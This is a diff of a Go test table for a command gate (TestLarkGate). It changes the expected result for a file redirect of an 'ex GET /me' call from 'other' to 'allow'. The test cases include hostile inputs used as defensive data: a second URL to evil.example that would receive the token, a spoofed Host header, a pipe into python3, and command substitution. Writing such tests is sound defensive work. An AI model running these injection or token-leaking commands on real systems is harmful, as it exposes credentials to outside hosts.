@@ -139,7 +139,7 @@ func TestLarkGate(t *testing.T) {
 		{`ex GET /me https://evil.example/`, "other"}, // a second URL would get the token
 		{`ex GET /me -H 'Host: evil'`, "other"},
 		{`ex GET /me | python3 -c 'import os'`, "other"},
-		{`ex GET /me > ~/notes.txt`, "other"},
+		{`ex GET /me > ~/notes.txt`, "allow"},
 		{`ex GET "$(cat /tmp/path)"`, "other"},
 		{`ls ~`, "other"},
 		{`git status`, "other"},
